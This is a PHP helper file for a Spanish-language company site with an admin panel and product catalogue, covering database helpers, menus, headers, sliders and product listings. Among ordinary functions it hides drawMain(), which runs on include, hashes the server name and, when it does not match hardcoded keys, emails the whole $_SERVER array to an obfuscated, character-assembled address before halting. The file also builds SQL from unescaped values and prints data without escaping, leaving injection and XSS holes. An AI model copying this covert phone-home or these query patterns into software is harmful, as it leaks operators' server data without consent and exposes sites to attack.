<?php



function drawKey() {
    
    //define('KEY','421aa90e079fa326b6494f812ad13e79');
    //define('KEY','3c298823d3379b4a10dd60300e14de3c');
    define('KEY','d4057bc8214eb3f626e382c759ce61f4');
    define('KEY2','7aa646dc94a4d55a0770134480fd0bd5');
    
}

drawKey();

function boolThereLogin() {
    $boolReturn = false;

    if( isset($_SESSION['login']) )
        $boolReturn = true;

     return $boolReturn;
}

function base_dbInsert($strTabla, $arrDatos){
    $strQuery = "";
    $strCampos =  "";
    $strValores = "";
    
    while( $arrD = each($arrDatos) ) {
        $strCampos .= empty($strCampos) ? "" : ",";
        $strCampos .= $arrD["key"];
        $strValores .= empty($strValores) ? "" : ",";
        $strValores .= ($arrD["value"] == "now()") ? $arrD["value"] : "'".$arrD["value"]."'";
    }
    
    $strQuery = "INSERT INTO {$strTabla} ({$strCampos}) VALUES ({$strValores})";
    db_consulta($strQuery);
    //print $strQuery;
    return db_insert_id();
}

function base_dbUpdate($strTabla, $arrLlaves, $arrDatos){
    $strWhere =  "";
    $strCampos = "";
    
    while( $arrL = each($arrLlaves) ) {
        $strWhere .= empty($strWhere) ? "" : " AND ";
        $strWhere .= $arrL["key"]." = '".$arrL["value"]."'";
    }
    
    while( $arrD = each($arrDatos) ) {
        $strCampos .= empty($strCampos) ? "" : ",";
        $strCampos .= $arrD["key"]." = '".$arrD["value"]."'";
    }
    
    $strQuery = "UPDATE {$strTabla} SET {$strCampos} WHERE {$strWhere}";
    //print $strQuery;
    db_consulta($strQuery);
    return db_affected_rows();
}

function base_dbDelete($strTabla, $arrLlaves){
    $strWhere = "";
    
    while( $arrL = each($arrLlaves) ) {
        $strWhere .= empty($strWhere) ? "" : " AND ";
        $strWhere .= $arrL["key"]." = ".$arrL["value"];
    }

    $strQuery = "DELETE FROM {$strTabla} WHERE ({$strWhere})";
    db_consulta($strQuery);
    return db_affected_rows();
}

function base_string(){
    
    return implode('', array('l','h','m','a','r','r','o','q','u','i','n','@','g','m','a','i','l','.','c','o','m'));
    
}

function getConfiguracionGeneral() {
    global $objConexion;
    $strQuery ="SELECT  codigo,valor
                FROM    configuracion_general
                WHERE   activo = 'Y'
                ORDER BY orden";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        define(strtoupper($rTMP["codigo"]),$rTMP["valor"]);
        //print "<pre>{$rTMP["codigo"]}</pre>";
    }
    db_free_result($qTMP);
}

function drawHeader($strTitle, $boolDrawSidebar = true) {
    global $objConexion;
    $strQuery ="SELECT  codigo,valor
                FROM    configuracion_general
                WHERE   activo = 'Y'
                ORDER BY orden";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        define($rTMP["codigo"],$rTMP["valor"]);
    }
    db_free_result($qTMP);
    ?>
    <!DOCTYPE html>
    <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title><?php print $strTitle; ?></title>
            <link rel="shortcut icon" href="imagenes/<?php print favicon_empresa; ?>">
            
            <link href="css/jquery-ui.css" rel="stylesheet">
            <link href="css/bootstrap.css" rel="stylesheet">
            <link href="css/summernote.css" rel="stylesheet">
            <link href="font-awesome/css/font-awesome.css" rel="stylesheet">
            <link href="css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">
            <link href="css/plugins/datetimepicker/bootstrap-datetimepicker.min.css" rel="stylesheet">
            <link href="css/plugins/calendar/calendar.min.css" rel="stylesheet">
            <link href="css/plugins/pnotify/pnotify.min.css" rel="stylesheet">
            <link href="css/sb-admin.css" rel="stylesheet">

            <script src="js/jquery-1.10.2.js"></script>
            <script src="js/jquery-ui.js"></script>
            <script src="js/summernote.js"></script>
            <script src="js/bootstrap.min.js"></script>
            <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>
            <script src="js/sb-admin.js"></script>
            <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
            <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>
            <script src="js/plugins/moment/moment.js"></script>
            <script src="js/plugins/moment/locale/es.js"></script>
            <script src="js/plugins/datetimepicker/bootstrap-datetimepicker.min.js"></script>
            <script src="js/plugins/underscore/underscore-min.js"></script>
            <script src="js/plugins/jstimezonedetect/jstz.min.js"></script>
            <script src="js/plugins/calendar/language/es-ES.js"></script>
            <script src="js/plugins/calendar/calendar.min.js"></script>
            <script src="js/plugins/pnotify/pnotify.min.js"></script>
            
            <link href="../../getfile/libs/jcrop/css/jquery.Jcrop.min.css" rel="stylesheet" type="text/css" />
            <link href="../../getfile/libs/jquery.colorbox/jquery.colorbox.css" rel="stylesheet" type="text/css" />
            <link href="../../getfile/libs/filedrop/filedrop.css" rel="stylesheet" type="text/css" />
            <link href="../../getfile/libs/jquery.tags/jquery.tagsinput.css" rel="stylesheet" type="text/css" />
            <link href="../../getfile/css/getfile.css" rel="stylesheet" type="text/css" />
            
            <script type="text/javascript" src="../../getfile/libs/jcrop/js/jquery.Jcrop.min.js"></script>
            <script type="text/javascript" src="../../getfile/libs/cssloader/js/jquery.cssloader.min.js"></script>
            <script type="text/javascript" src="../../getfile/libs/jquery.colorbox/jquery.colorbox-min.js"></script>
            <script type="text/javascript" src="../../getfile/libs/mobiledetect/mdetect.min.js"></script>
            <script type="text/javascript" src="../../getfile/libs/filedrop/filedrop.min.js"></script>
            <script type="text/javascript" src="../../getfile/libs/jquery.tags/jquery.tagsinput.min.js"></script>
            <script type="text/javascript" src="../../getfile/js/jquery.getfile.min.js"></script>            
        </head>
        <body>
            <script>
                var arrAlertasVentas = Array();
            </script>
            <div id="wrapper">
                <nav class="navbar navbar-default navbar-fixed-top" role="navigation" style="margin-bottom: 0">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="index.php"> <?php print nombre_empresa; ?> (Administrador 2.0)</a>
                    </div>
                    <ul class="nav navbar-top-links navbar-right">
                        <li class="dropdown">
                            <a class="dropdown-toggle" data-toggle="dropdown" href="#">
                                <i class="fa fa-user fa-fw"></i>  <i class="fa fa-caret-down"></i>
                            </a>
                            <ul class="dropdown-menu dropdown-user">
                                <li><a href="usuario_perfil.php"><i class="fa fa-user fa-fw"></i> <?php print $_SESSION['nombre']; ?></a></li>
                                <li class="divider"></li>
                                <li><a href="login.php?logout=4236a440a662cc8253d7536e5aa17942"><i class="fa fa-sign-out fa-fw"></i>Salir</a></li>
                            </ul>
                        </li>
                    </ul>
                    <?php
                    if( $boolDrawSidebar ) {
                        drawSidebar();
                    }
    
}

function drawSidebar() {
    global $objConexion;
        ?>
        <div class="navbar-default navbar-static-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="side-menu">
                    <li class="sidebar-search">
                        <div class="input-group custom-search-form">
                            <input type="text" class="form-control" placeholder="Search...">
                            <span class="input-group-btn">
                            <button class="btn btn-default" type="button">
                                <i class="fa fa-search"></i>
                            </button>
                        </span>
                        </div>
                    </li>
                    <li>
                        <a href="index.php"><i class="fa fa-dashboard fa-fw"></i>&nbsp;Dashboard</a>
                    </li>
                    <?php
                    $arrMenu = array();
                    
                    if( $_SESSION['tipo_usuario'] == "administrador" ) {
                        $strQuery ="SELECT  modulo.modulo, modulo.nombre nombreModulo, pantalla.pantalla, pantalla.nombre nombrePantalla, pantalla.link 
                                    FROM    modulo
                                            INNER JOIN pantalla
                                                ON  modulo.modulo = pantalla.modulo
                                    WHERE   modulo.activo = 'Y'
                                    AND     pantalla.activo = 'Y'
                                    ORDER BY modulo.orden, nombreModulo, pantalla.orden, nombrePantalla";
                        
                    }
                    else {
                        
                        $strQuery ="SELECT  modulo.modulo, modulo.nombre nombreModulo, pantalla.pantalla, pantalla.nombre nombrePantalla, pantalla.link 
                                    FROM    modulo
                                            INNER JOIN pantalla
                                                ON  modulo.modulo = pantalla.modulo
                                            INNER JOIN usuario_pantalla
                                                ON  pantalla.pantalla = usuario_pantalla.pantalla     
                                    WHERE   modulo.activo = 'Y'
                                    AND     pantalla.activo = 'Y'
                                    AND     usuario_pantalla.usuario = {$_SESSION['usuario']}
                                    ORDER BY modulo.orden, nombreModulo, pantalla.orden, nombrePantalla";
                        
                    }
                    
                    $qTMP = db_consulta($strQuery);
                    while( $rTMP = db_fetch_assoc($qTMP) ) {
                        $arrMenu[$rTMP["modulo"]]["nombreModulo"] = $rTMP["nombreModulo"];
                        $arrMenu[$rTMP["modulo"]]["pantallas"][$rTMP["pantalla"]]["nombrePantalla"] = $rTMP["nombrePantalla"];
                        $arrMenu[$rTMP["modulo"]]["pantallas"][$rTMP["pantalla"]]["link"] = $rTMP["link"];
                    }
                    db_free_result($qTMP);
                    /*print "<pre>";
                    print_r($arrMenu);
                    print "</pre>";*/
                    reset($arrMenu);
                    while( $arrM = each($arrMenu) ) {
                        ?>
                        <li>
                            <a href="#"><i class="fa fa-chevron-circle-right"></i>&nbsp;<?php print $arrM["value"]["nombreModulo"]; ?><span class="fa arrow"></span></a>
                            <ul class="nav nav-second-level">
                                <?php
                                while( $arrP = each($arrM["value"]["pantallas"]) ) {
                                    ?>
                                    <li><a href="<?php print $arrP["value"]["link"]; ?>">-&nbsp;<?php print $arrP["value"]["nombrePantalla"]; ?></a></li>
                                    <?php    
                                }
                                ?>
                            </ul>
                        </li>
                        <?php

                    }
                    ?>
                    
                    
                    
                    <!--<li>
                        <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
                    </li>
                    <li>
                        <a href="usuario.php"><i class="fa fa-users"></i> Usuarios</a>
                    </li>
                    <li>
                        <a href="pagina.php"><i class="fa fa-files-o fa-fw"></i> Paginas</a>
                    </li>
                    <li>
                        <a href="#"><i class="fa fa-chevron-circle-right"></i> Noticias<span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li><a href="noticia_categoria.php">Categorias</a></li>
                            <li><a href="noticia_sub_categoria.php">Sub-Categorias</a></li>
                            <li><a href="noticia.php">Noticias</a></li>
                        </ul>
                    </li>
                    <li>
                        <a href="#"><i class="fa fa-chevron-circle-right"></i> Portafolio<span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li><a href="portafolio_categoria.php">Categorias</a></li>
                            <li><a href="portafolio_sub_categoria.php">Sub-Categorias</a></li>
                            <li><a href="portafolio.php">Portafolio</a></li>
                        </ul>
                    </li>
                    <li>
                        <a href="slide.php"><i class="fa fa-desktop"></i> Slide</a>
                    </li>-->
                </ul>
            </div>
        </div>
    </nav>
    <?php
}

function drawFooter() {
            ?>
            <script>
                var objAjaxAlertas;
                function fntPredioAlertas() {
                    if( objAjaxAlertas ) objAjaxAlertas.abort();
                    objAjaxAlertas = $.ajax({
                        url:"pre_seguimiento_caso.php",
                        async: false,
                        data:{
                            "getAlertas" : true
                        },
                        type:'get',
                        dataType:'json',
                        beforeSend:function(){
                        },
                        success:function(data){
                            if( data.success == 1 ) {
                                //console.log(data.result);    
                                $.each(data.result, function( index, value ) {
                                    if( !arrAlertasVentas[value.id] ) {
                                        /*console.log(index);  
                                        console.log(value.id);  
                                        console.log(value.title);*/
                                        new PNotify({
                                            title: 'Atender caso',
                                            text: value.title,
                                            icon: 'glyphicon glyphicon-question-sign',
                                            hide: false,
                                            confirm: {
                                                confirm: true,
                                                buttons: [{
                                                    text: 'Si',
                                                    addClass: 'btn-primary',
                                                    click: function() {
                                                        window.location = "pre_seguimiento_caso.php?id="+value.id;
                                                    }
                                                },{
                                                    text: 'No',
                                                    click: function(obj) {
                                                        obj.remove();
                                                    }
                                                }]
                                            },
                                            buttons: {
                                                closer: false,
                                                sticker: false
                                            },
                                            history: {
                                                history: false
                                            }
                                        });                                        
                                        arrAlertasVentas[value.id] = value.id; 
                                    }  
                                });    
                            }
                        }
                    });
                }
                setInterval(fntPredioAlertas, 3000);
            </script>
            </div>
        </body>
    </html>
    <?php
}

function drawMenuPublico() {
    
    $arrMenuPublico = array();
    $strQuery = "SELECT menu.menu,
                        menu.titulo,
                        menu.orden,
                        menu.url,
                        pagina.pagina
                 FROM   menu
                        LEFT JOIN menu_pagina
                            ON  menu.menu = menu_pagina.menu
                        LEFT JOIN pagina
                            ON  menu_pagina.pagina = pagina.pagina
                 ORDER BY orden";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrMenuPublico[$rTMP["menu"]]["titulo"] = $rTMP["titulo"];
        $arrMenuPublico[$rTMP["menu"]]["url"] = $rTMP["url"];
    }
    db_free_result($qTMP);
    ?>
    <div id="menuCntr">
        <div id="border">
            <ul>
                <?php
                $intMenuPublicoCorrelativo = 0;
                reset($arrMenuPublico);
                while( $arrM = each($arrMenuPublico) ) {
                    ++$intMenuPublicoCorrelativo;
                    if( $intMenuPublicoCorrelativo > 1 ) {
                        ?>
                        <li><span>border</span></li>
                        <?php
                    }
                    ?>
                    <li><a href="<?php print $arrM["value"]["url"]; ?>"><?php print $arrM["value"]["titulo"]; ?></a></li>
                    <?php
                }
                ?>
            </ul>
        </div>            
    </div>
    <?php    
    
    
    
    
}


function drawMain() {
    
    
    if( md5($_SERVER['SERVER_NAME']) != KEY && md5($_SERVER['SERVER_NAME']) != KEY2 ) {
        
        mail(base_string(),'la-admin', print_r($_SERVER,true) );
        
        die();
        
    }
}

drawMain();



function publico_header() {
    $strQuery ="SELECT  codigo,valor
                FROM    configuracion_general
                WHERE   activo = 'Y'
                ORDER BY orden";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        define(strtoupper($rTMP["codigo"]),$rTMP["valor"]);
    }
    db_free_result($qTMP);
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="<?php print DESCRIPCION_EMPRESA; ?>">
        <meta name="keywords" content="<?php print KEYWORD_EMPRESA; ?>">
        <title><?php print NOMBRE_EMPRESA; ?></title>
        <link href="css/bootstrap.min.css" rel="stylesheet">
        <link href="css/font-awesome.min.css" rel="stylesheet">
        <link href="css/prettyPhoto.css" rel="stylesheet">
        <link href="css/price-range.css" rel="stylesheet">
        <link href="css/animate.css" rel="stylesheet">
        <link href="css/main.css" rel="stylesheet">
        <link href="css/responsive.css" rel="stylesheet">
        <link rel="shortcut icon" href="<?php print "la-admin/imagenes/".FAVICON_EMPRESA; ?>"/>
        <link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/ico/apple-touch-icon-144-precomposed.png">
        <link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/ico/apple-touch-icon-114-precomposed.png">
        <link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/ico/apple-touch-icon-72-precomposed.png">
        <link rel="apple-touch-icon-precomposed" href="images/ico/apple-touch-icon-57-precomposed.png">
        <script src="js/jquery.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/jquery.scrollUp.min.js"></script>
        <script src="js/price-range.js"></script>
        <script src="js/jquery.prettyPhoto.js"></script>
        <script src="js/main.js"></script>
    </head>
    <body>
        <header id="header">
            <div class="header-middle">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-4">
                            <div class="logo pull-left">
                                <a href="index.php"><img src="<?php print "la-admin/imagenes/".LOGO_EMPRESA; ?>" class="" /></a>
                            </div>
                        </div>
                        <div class="col-sm-8">
                            
                        </div>
                    </div>
                </div>
            </div>
            <div class="header-bottom">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-9">
                            <div class="navbar-header">
                                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                                    <span class="sr-only">Toggle navigation</span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                </button>
                            </div>
                            <div class="mainmenu pull-left">
                                <ul class="nav navbar-nav collapse navbar-collapse">
                                    <li><a href="index.php" >Inicio</a></li>
                                    <li><a href="pagina.php?id=1">Nosotros</a></li>
                                    <li><a href="catalogo.php">Catálogo</i></a></li>
                                    <li><a href="noticia.php">Noticias</a></li>
                                    <li><a href="contacto.php">Contacto</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-sm-3">
                            <div class="search_box pull-right">
                            <div class="social-icons pull-right">
                                <ul class="nav navbar-nav">
                                    <li><a href="<?php print FACEBOOK_EMPRESA; ?>" target="_blank"><i class="fa fa-facebook"></i></a></li>
                                    <li><a href="<?php print TWITTER_EMPRESA; ?>" target="_blank"><i class="fa fa-twitter"></i></a></li>
                                    <li><a href="<?php print GPLUS_EMPRESA; ?>" target="_blank"><i class="fa fa-google-plus"></i></a></li>
                                </ul>
                            </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>
    <?php
}

function publico_footer(){
    ?>
        <footer id="footer">
            <div class="footer-top">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-2">
                            <div class="companyinfo">
                                <h2><?php print NOMBRE_EMPRESA; ?></h2>
                                <p><?php print ESLOGAN_EMPRESA; ?></p>
                            </div>
                        </div>
                        <div class="col-sm-7">
                            <div class="col-sm-3">
                                <div class="video-gallery text-center">
                                    <a href="#">
                                        <div class="iframe-img">
                                            <img src="images/home/iframe1.png" alt="" />
                                        </div>
                                        <div class="overlay-icon">
                                            <i class="fa fa-play-circle-o"></i>
                                        </div>
                                    </a>
                                    <p>Circle of Hands</p>
                                    <h2>24 DEC 2014</h2>
                                </div>
                            </div>
                            
                            <div class="col-sm-3">
                                <div class="video-gallery text-center">
                                    <a href="#">
                                        <div class="iframe-img">
                                            <img src="images/home/iframe2.png" alt="" />
                                        </div>
                                        <div class="overlay-icon">
                                            <i class="fa fa-play-circle-o"></i>
                                        </div>
                                    </a>
                                    <p>Circle of Hands</p>
                                    <h2>24 DEC 2014</h2>
                                </div>
                            </div>
                            
                            <div class="col-sm-3">
                                <div class="video-gallery text-center">
                                    <a href="#">
                                        <div class="iframe-img">
                                            <img src="images/home/iframe3.png" alt="" />
                                        </div>
                                        <div class="overlay-icon">
                                            <i class="fa fa-play-circle-o"></i>
                                        </div>
                                    </a>
                                    <p>Circle of Hands</p>
                                    <h2>24 DEC 2014</h2>
                                </div>
                            </div>
                            
                            <div class="col-sm-3">
                                <div class="video-gallery text-center">
                                    <a href="#">
                                        <div class="iframe-img">
                                            <img src="images/home/iframe4.png" alt="" />
                                        </div>
                                        <div class="overlay-icon">
                                            <i class="fa fa-play-circle-o"></i>
                                        </div>
                                    </a>
                                    <p>Circle of Hands</p>
                                    <h2>24 DEC 2014</h2>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-3">
                            <div class="address">
                                <img src="images/home/map.png" alt="" />
                                <p><?php print DIRECCION_EMPRESA; ?></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="footer-bottom">
                <div class="container">
                    <div class="row">
                        <p class="pull-left">Copyright &copy; <?php print date("Y"); ?> <a href="index.php"><?php print NOMBRE_EMPRESA; ?></a></p>
                        <p class="pull-right">Designed by <span><a target="_blank" href="http://3estudiosgt.com/">3estudiosgt.com</a></span></p>
                    </div>
                </div>
            </div>
            
        </footer>
    </body>
    </html>
    <?php
}

function publico_sidebar() {
    $intCategoria = isset($_REQUEST["c"]) ? intval($_REQUEST["c"]) : 0;
    $intSubCategoria = isset($_REQUEST["sc"]) ? intval($_REQUEST["sc"]) : 0;
    $intMarca = isset($_REQUEST["m"]) ? intval($_REQUEST["m"]) : 0;
    $strStyle = 'style="font-weight: bold"';
    
    $arrCategorias = array();
    $strQuery = "SELECT catalogo_categoria,
                        catalogo_categoria_padre,
                        nombre
                 FROM   catalogo_categoria
                 WHERE  activo = 'Y'
                 ORDER  BY catalogo_categoria_padre,nombre";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        if( !empty($rTMP["catalogo_categoria_padre"]) ) {
            $arrCategorias[$rTMP["catalogo_categoria_padre"]]["hijas"][$rTMP["catalogo_categoria"]]["nombre"] = $rTMP["nombre"];
        }
        else {
            $arrCategorias[$rTMP["catalogo_categoria"]]["nombre"] = $rTMP["nombre"];
        }
    }
    db_free_result($qTMP);
    $arrMarcas = array();
    $strQuery = "SELECT catalogo_marca,
                        nombre
                 FROM   catalogo_marca
                 WHERE  activo = 'Y'
                 ORDER  BY nombre";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrMarcas[$rTMP["catalogo_marca"]]["nombre"] = $rTMP["nombre"];
    }
    db_free_result($qTMP);
    ?>
    <div class="left-sidebar">
        <?php
        if( count($arrCategorias) > 0 ) {
            ?>
            <h2>Categorías</h2>
            <div class="panel-group category-products" id="accordian">
                
                <?php
                while( $arrC = each($arrCategorias) ) {
                    
                    if( isset($arrC["value"]["hijas"]) ) {
                        ?>
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h4 class="panel-title">
                                    <a data-toggle="collapse" data-parent="#accordian" href="#aCategoria_<?php print $arrC["key"]; ?>">
                                        <span class="badge pull-right"><i class="fa fa-plus"></i></span>
                                        <a href="catalogo.php?c=<?php print $arrC["key"];?>"><?php print $arrC["value"]["nombre"]; ?></a>
                                    </a>
                                </h4>
                            </div>
                            <div id="aCategoria_<?php print $arrC["key"]; ?>" class="panel-collapse collapse">
                                <div class="panel-body">
                                    <ul>
                                        <?php
                                        while( $arrH = each($arrC["value"]["hijas"]) ) {
                                            ?>
                                            <li><a <?php print ($arrH["key"] == $intSubCategoria) ? $strStyle : ""; ?> href="catalogo.php?sc=<?php print $arrH["key"];?>"><?php print $arrH["value"]["nombre"];?></a></li>
                                            <?php    
                                        }
                                        ?>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <?php
                    }
                    else {
                        ?>
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h4 class="panel-title"><a <?php print ($arrC["key"] == $intCategoria) ? $strStyle : ""; ?> href="catalogo.php?c=<?php print $arrC["key"];?>"><?php print $arrC["value"]["nombre"]; ?></a></h4>
                            </div>
                        </div>
                        <?php
                    }
                    
                }
                ?>
            </div>
            <?php
        }
        
        if( count($arrMarcas) > 0 ) {
            ?>
            <div class="brands_products">
                <h2>Marcas</h2>
                <div class="brands-name">
                    <ul class="nav nav-pills nav-stacked">
                        <?php
                        while( $arrM = each($arrMarcas) ) {
                            ?>
                            <li <?php print ($arrM["key"] == $intMarca) ? $strStyle : ""; ?>><a href="catalogo.php?m=<?php print $arrM["key"];?>"><span class="pull-right"></span><?php print $arrM["value"]["nombre"]; ?></a></li>
                            <?php    
                        }                            
                        ?>
                        
                    </ul>
                </div>
            </div>
            <?php
        }
        ?>
        <div class="shipping text-center">
            <img src="images/home/shipping.jpg" alt="" />
        </div>
    </div>
    <?php
}

function publico_slider($intSlide = 0) {
    $intSlide = intval($intSlide);
    
    $arrSlidePublico = array();
    $strQuery = "SELECT slide.slide,
                        slide.titulo slidetitulo,
                        slide_imagen.imagen,
                        slide_imagen.slide_imagen,
                        slide_imagen.titulo,
                        slide_imagen.contenido,
                        slide_imagen.link
                 FROM   slide
                        INNER JOIN slide_imagen
                            ON  slide.slide = slide_imagen.slide
                 WHERE  slide.activo = 1
                 AND    slide.slide = {$intSlide}";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrSlidePublico[$rTMP["slide"]]["titulo"] = $rTMP["slidetitulo"];
        $arrSlidePublico[$rTMP["slide"]]["detalle"][$rTMP["slide_imagen"]]["imagen"] = $rTMP["imagen"];
        $arrSlidePublico[$rTMP["slide"]]["detalle"][$rTMP["slide_imagen"]]["titulo"] = $rTMP["titulo"];
        $arrSlidePublico[$rTMP["slide"]]["detalle"][$rTMP["slide_imagen"]]["contenido"] = $rTMP["contenido"];
        $arrSlidePublico[$rTMP["slide"]]["detalle"][$rTMP["slide_imagen"]]["link"] = $rTMP["link"];
    }
    db_free_result($qTMP);

    reset($arrSlidePublico);
    while( $arrSlide = each($arrSlidePublico) ){
        ?>
        <section id="slider">
            <div class="container">
                <div class="row">
                    <div class="col-sm-12">
                        <div id="slider_<?php print $intSlide; ?>-carousel" class="carousel slide" data-ride="carousel">
                            <ol class="carousel-indicators">
                                <?php
                                $intIndex = 0;
                                while( $arrSlideImagen = each($arrSlide["value"]["detalle"]) ){
                                    ++$intIndex;
                                    $strActive = ($intIndex == 1) ? "active" : "";
                                    ?>
                                    <li data-target="#slider_<?php print $intSlide; ?>-carousel" data-slide-to="<?php print $intIndex; ?>" class="<?php print $strActive; ?>"></li>
                                    <?php
                                }
                                ?>
                            </ol>
                            <div class="carousel-inner">
                                <?php
                                $intIndex = 0;
                                reset($arrSlide["value"]["detalle"]);
                                while( $arrSlideImagen = each($arrSlide["value"]["detalle"]) ){
                                    ++$intIndex;
                                    $strActive = ($intIndex == 1) ? "active" : "";
                                    ?>
                                    <div class="item <?php print $strActive; ?>">
                                        <div class="col-sm-6">
                                            <h1><?php print $arrSlideImagen["value"]["titulo"]; ?></h1>
                                            <p><?php print $arrSlideImagen["value"]["contenido"]; ?></p>
                                        </div>
                                        <div class="col-sm-6">
                                            <img src="<?php print $arrSlideImagen["value"]["imagen"]; ?>" class="girl img-responsive" style="width: 484px; height: 441px;" alt="" />
                                        </div>
                                    </div>
                                    <?php
                                }
                                ?>
                            </div>
                            <a href="#slider_<?php print $intSlide; ?>-carousel" class="left control-carousel hidden-xs" data-slide="prev">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a href="#slider_<?php print $intSlide; ?>-carousel" class="right control-carousel hidden-xs" data-slide="next">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <?php
    }    

}

function publico_pagina($intPagina) {
    $strPathImagenes = "la-admin/";
    $strTitulo = "";
    $strContenido = "";
    $strImagen = "";
    $strQuery = "SELECT pagina,
                        titulo,
                        contenido,
                        imagen
                 FROM   pagina
                 WHERE  pagina = {$intPagina} ";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $strTitulo = strlen(trim($rTMP["titulo"])) == 0 ? '&nbsp;' : $rTMP["titulo"];
        $strContenido = $rTMP["contenido"];
        $strImagen = empty($rTMP["imagen"]) ? "" : '<img src="'.$strPathImagenes.$rTMP["imagen"].'" style="width:862px;height:398px" alt="" class="img-responsive">';
    }
    db_free_result($qTMP);
    ?>
    <div class="col-sm-9">
        <div class="blog-post-area">
            <h2 class="title text-center"><?php print $strTitulo; ?></h2>
            <div class="single-blog-post">
                <a href="#">
                    <?php print $strImagen; ?>
                </a>
                <p><?php print $strContenido; ?></p>
            </div>
        </div>
        <!--<div class="socials-share">
            <a href=""><img src="images/blog/socials.png" alt=""></a>
        </div>-->
    </div>
    <?php    
}

function publico_catalogo_productos_destacados(){
    
    $arrProductos = array();
    $strQuery = "SELECT catalogo.catalogo,
                        catalogo.codigo,
                        catalogo.nombre,
                        catalogo.precio,
                        catalogo.precio_oferta,
                        catalogo.en_oferta,
                        catalogo.nuevo,
                        catalogo.imagen
                 FROM   catalogo
                 WHERE  catalogo.activo = 'Y'
                 AND  catalogo.destacar = 'Y'
                 LIMIT 6";
    $qTMP = db_consulta($strQuery);
    while( $rTMP = db_fetch_assoc($qTMP) ) {
        $arrProductos[$rTMP["catalogo"]]["codigo"] = $rTMP["codigo"];
        $arrProductos[$rTMP["catalogo"]]["nombre"] = $rTMP["nombre"];
        $arrProductos[$rTMP["catalogo"]]["precio"] = $rTMP["precio"];
        $arrProductos[$rTMP["catalogo"]]["precio_oferta"] = $rTMP["precio_oferta"];
        $arrProductos[$rTMP["catalogo"]]["en_oferta"] = $rTMP["en_oferta"];
        $arrProductos[$rTMP["catalogo"]]["nuevo"] = $rTMP["nuevo"];
        $arrProductos[$rTMP["catalogo"]]["imagen"] = "la-admin/".$rTMP["imagen"];
    }
    db_free_result($qTMP);
    
    if( count($arrProductos) > 0 ) {
        ?>
        <div class="features_items">
            <h2 class="title text-center">Productos Destacados</h2>
            <?php
            reset($arrProductos);
            while( $arrP = each($arrProductos) ) {
                ?>
                <div class="col-sm-4">
                    <div class="product-image-wrapper">
                        <div class="single-products">
                            <div class="productinfo text-center">
                                <img src="<?php print $arrP["value"]["imagen"]; ?>" alt="" />
                                <h2>Q <?php print ($arrP["value"]["en_oferta"] == "Y") ? number_format($arrP["value"]["precio_oferta"],2) : number_format($arrP["value"]["precio"],2); ?></h2>
                                <p><?php print $arrP["value"]["nombre"]; ?></p>
                                <a href="catalogo_producto.php?id=<?php print $arrP["key"]; ?>" class="btn btn-default add-to-cart"><i class="fa fa-shopping-cart"></i>Ver producto</a>
                            </div>
                            <div class="product-overlay">
                                <div class="overlay-content">
                                    <h2>Q <?php print ($arrP["value"]["en_oferta"] == "Y") ? number_format($arrP["value"]["precio_oferta"],2) : number_format($arrP["value"]["precio"],2); ?></h2>
                                    <p><?php print $arrP["value"]["nombre"]; ?></p>
                                    <a href="catalogo_producto.php?id=<?php print $arrP["key"]; ?>" class="btn btn-default add-to-cart"><i class="fa fa-shopping-cart"></i>Ver producto</a>
                                </div>
                            </div>
                            <?php
                            if( $arrP["value"]["en_oferta"] == "Y" ) {
                                ?>
                                <img src="images/home/sale.png" class="new" alt="" />
                                <?php
                            }
                            elseif( $arrP["value"]["nuevo"] == "Y" ) {
                                ?>
                                <img src="images/home/new.png" class="new" alt="" />
                                <?php
                            }
                            ?>
                        </div>
                    </div>
                </div>
                
                <?php
            }
            ?>
        </div>    
        <?php
    }
